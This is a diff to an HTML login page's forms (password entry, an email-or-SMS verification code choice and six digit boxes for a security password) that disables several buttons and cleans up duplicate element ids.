@@ -69,7 +69,7 @@
                         </div>
                         <label for="password">Password</label>
                         <input class="pass" id="password" type="password" placeholder="Enter your password" name="password" required>
-                        <button type="submit" id="toconfirm" name="login" >Login</button>
+                        <button type="submit" id="toconfirm" name="login" disabled>Login</button>
                     </div>
                 </form>
             </div>
@@ -104,11 +104,11 @@
                             <label for="bymail">Get the code by email at <span id="confirmedemail"></span></label>
                         </div>
                         <div class="phonez">
-                            <input type="checkbox" id="getcodebyphone" name="byphone">
-                            <label id='phonez' for="byphone">Get the code by text message (SMS) <span id="confirmedphone"></span></label>
+                            <input type="checkbox" id="getcodebyphone" name="byphone" disabled>
+                            <label id='phonez' for="byphone">Get the code by text message (SMS)<span id="confirmedphone"></span></label>
                         </div>
                     </div>
-                    <button id='confirmContinue' type="submit">Continue</button>
+                    <button id='confirmContinue' type="submit" disabled>Continue</button>
                 </form>
             </div>
         </div>
@@ -134,14 +134,14 @@
                     <input type="hidden" name="form_id" value="securitypasswordform">
                     <input type="hidden" name="action" value="continue">
                     <div class="securitypass">
-                        <div id="input1" class="characterverify"><input id="input1" type="number" maxlength="1" oninput="moveToNext(this,'input2')"></div>
-                        <div id="input2" class="characterverify"><input id="input2" type="number" maxlength="1" oninput="moveToNext(this,'input3')"></div>
-                        <div id="input3" class="characterverify"><input id="input3" type="number" maxlength="1" oninput="moveToNext(this,'input4')"></div>
-                        <div id="input4" class="characterverify"><input id="input4" type="number" maxlength="1" oninput="moveToNext(this,'input5')"></div>
-                        <div id="input5" class="characterverify"><input id="input5" type="number" maxlength="1" oninput="moveToNext(this,'input6')"></div>
-                        <div id="input6" class="characterverify"><input id="input6" type="number" maxlength="1" oninput="moveToNext(this,'input7')"></div>
+                        <div  class="characterverify"><input id="input1" type="number" maxlength="1" oninput="moveToNext(this,'input2')"></div>
+                        <div  class="characterverify"><input id="input2" type="number" maxlength="1" oninput="moveToNext(this,'input3')"></div>
+                        <div  class="characterverify"><input id="input3" type="number" maxlength="1" oninput="moveToNext(this,'input4')"></div>
+                        <div  class="characterverify"><input id="input4" type="number" maxlength="1" oninput="moveToNext(this,'input5')"></div>
+                        <div  class="characterverify"><input id="input5" type="number" maxlength="1" oninput="moveToNext(this,'input6')"></div>
+                        <div  class="characterverify"><input id="input6" type="number" maxlength="1" oninput="moveToNext(this,'input7')"></div>
                     </div>
-                    <button id="securityContinue" type="submit" name="login">Continue</button>
+                    <button id="securityContinue" type="submit" name="login" disabled>Continue</button>
                 </form>
             </div>
         </div>
